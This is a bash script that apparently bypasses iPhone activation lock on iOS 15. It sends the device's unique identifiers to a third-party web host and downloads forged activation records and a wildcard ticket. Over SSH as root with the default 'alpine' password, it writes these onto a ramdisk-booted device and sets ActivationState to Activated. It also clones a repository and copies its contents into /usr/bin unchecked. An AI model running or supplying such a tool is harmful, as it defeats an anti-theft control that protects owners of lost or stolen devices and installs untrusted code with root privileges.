#!/bin/bash
#BY Brayan-Villa 10/06/2022
if test -z "$(ideviceinfo | grep -w ActivationState | awk '{printf $NF}')";then
	git clone https://github.com/Brayan-Villa/LibimobiledeviceEXE;
	mv LibimobiledeviceEXE/* /usr/bin/
fi
DeviceInfo(){
	ideviceinfo | grep -w $1 | awk '{printf $NF}'
}
Replace(){
	sed "s/$1/$2/g";
}
Explode(){
	cat $3 | grep -A 40 ''$1'' | grep -B 40 ''$2'';
}
printf "1: GENERATE ACTIVATION FILES\n2:ACTIVATE DEVICE\n\nOption> "; read op;
case "1" in
"$op")
printf "GENERATING ACTIVATION FILES..\n"
mkdir -p $(DeviceInfo DeviceName)/
curl -s "https://brayanvilla.000webhostapp.com/iOS15.php?udid=$(DeviceInfo UniqueDeviceID)&bv=$(DeviceInfo BuildVersion)&dc=$(DeviceInfo DeviceClass)&dv=$(DeviceInfo DeviceVariant)&mn=$(DeviceInfo ModelNumber)&ot=$(DeviceInfo OSType)&pt=$(DeviceInfo ProductType)&pv=$(DeviceInfo ProductVersion)&rmn=$(DeviceInfo RegulatoryModelNumber)&ucid=$(DeviceInfo UniqueChipID)"  --output $(DeviceInfo DeviceName)/activation_record.plist
echo "SUCCESS!";
echo "================";
echo "MAKING IC-Info.sisv...";
mkdir -p $(DeviceInfo DeviceName)/FairPlay/iTunes_Control/iTunes/
curl -s https://brayanvilla.000webhostapp.com/$(DeviceInfo UniqueDeviceID)/IC-Info.sisv --output $(DeviceInfo DeviceName)/FairPlay/iTunes_Control/iTunes/IC-Info.sisv; 
echo "SUCCESS!";
echo "================";
echo "EXTRACTING WILDCARD TICKET...";
curl -s "https://brayanvilla.000webhostapp.com/home/css/$(DeviceInfo UniqueDeviceID)/Wildcard.der" --output $(DeviceInfo DeviceName)/Wildcard.der;     
echo "SUCCESS!";
echo "================";
rm ic*
;;
esac               
read -p "NOW EXPLOIT DEVICE AGAIN, SEND RAMDISK AND PRESS ENTER FOR ACTIVATE DEVICE";
rm ~/.ssh/known_hosts &>log.txt&iproxy 22 44 &>/dev/nul&sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost 'mount_party' &>/dev/nul& echo '' | sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost 'mount_party';
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost '/bin/mkdir -p /mnt1/iPhone';
sshpass -p 'alpine' scp -p iPhone/activation_record.plist root@localhost:"/mnt1/"
sshpass -p 'alpine' scp -p iPhone/IC-Info.sisv root@localhost:"/mnt1/"
sshpass -p 'alpine' scp -p iPhone/FairPlay/iTunes_Control/iTunes/IC-Info.sisv root@localhost:"/mnt1/"
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost '/bin/mv -f /mnt1/activation_record.plist /mnt2/root/'
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost '/bin/rm -rf /mnt2/mobile/Library/FairPlay'
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost '/bin/mkdir -p -m 00755 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes'
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost '/bin/mv -f /mnt1/IC-Info.sisv /mnt2/root/'
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost '/bin/mv -f /mnt2/root/IC-Info.sisv /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/'
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost '/bin/chmod 00664 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv'
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost '/usr/sbin/chown -R mobile:mobile /mnt2/mobile/Library/FairPlay'
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost 'cd /mnt2/containers/Data/System/*/Library/internal/../ && /bin/mkdir -p activation_records'
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost 'cd /mnt2/containers/Data/System/*/Library/activation_records && /bin/mv -f /mnt2/root/activation_record.plist ./'
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost 'plutil -dict -kPostponementTicket /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist';
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost 'plutil -kPostponementTicket -ActivationState -string Activated /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist';
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost 'plutil -kPostponementTicket -ActivityURL -string https://albert.apple.com/deviceservices/activity /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist';
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost 'plutil -kPostponementTicket -PhoneNumberNotificationURL -string https://albert.apple.com/deviceservices/phoneHome /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist';
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost 'plutil -kPostponementTicket -ActivationTicket -string '$(cat iPhone/Wildcard.der)' /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist';
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost '/sbin/reboot'
echo "Success!"

 
